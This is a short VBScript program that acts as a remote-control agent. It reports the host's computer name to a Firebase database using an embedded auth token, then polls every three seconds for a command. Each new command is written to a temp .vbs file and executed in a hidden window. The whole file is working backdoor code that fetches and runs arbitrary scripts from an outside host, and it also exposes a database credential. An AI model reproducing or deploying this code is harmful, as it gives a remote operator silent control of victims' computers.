' Create a WScript.Shell object
Set objShell = WScript.CreateObject("WScript.Shell")

' Create an XMLHttpRequest object
Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")

Set objNetwork = WScript.CreateObject("WScript.Network")

' Firebase Realtime Database URL
firebaseURL = "https://vxncoder-default-rtdb.firebaseio.com/devices/" & objNetwork.ComputerName & ".json?auth=Iq57RCVkL8ocygl9BBgFcGIGgRhazIsg9pJu8Wzw"

dataToUpdate = "{""command"": ""start""}"

Dim lastData
lastData = ""

Function UpdateData()
    objXMLHttp.Open "PUT", firebaseURL, False
    objXMLHttp.setRequestHeader "Content-Type", "application/json"
    objXMLHttp.Send dataToUpdate
End Function


' Function to check for updates
Function CheckForUpdates()
    objXMLHttp.Open "GET", firebaseURL, False
    objXMLHttp.setRequestHeader "Content-Type", "application/json"
    objXMLHttp.Send

    If objXMLHttp.Status = 200 Then
        Dim currentData
        currentData = objXMLHttp.responseText
        
        ' Extract the command from the JSON response
        Dim commandStart, commandEnd, extractedCommand
        commandStart = InStr(currentData, """command"":""") + Len("""command"":""")
        commandEnd = InStr(commandStart, currentData, """}")
        extractedCommand = Mid(currentData, commandStart, commandEnd - commandStart)
        extractedCommand = Replace(extractedCommand, "\", "")
        
        If extractedCommand <> lastData And extractedCommand <> "start" Then
            lastData = extractedCommand
            CreateAndExecuteScript extractedCommand
        End If
    End If
End Function

Sub CreateAndExecuteScript(scriptContent)
    Dim fso, tempFile
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = fso.GetSpecialFolder(2) & "\tempScript.vbs"
    Dim file
    Set file = fso.CreateTextFile(tempFile, True)
    file.WriteLine scriptContent
    file.Close
    objShell.Run "wscript.exe " & tempFile, 0, True
End Sub

UpdateData()

' Polling loop
Do
    CheckForUpdates()
    WScript.Sleep 3000
Loop
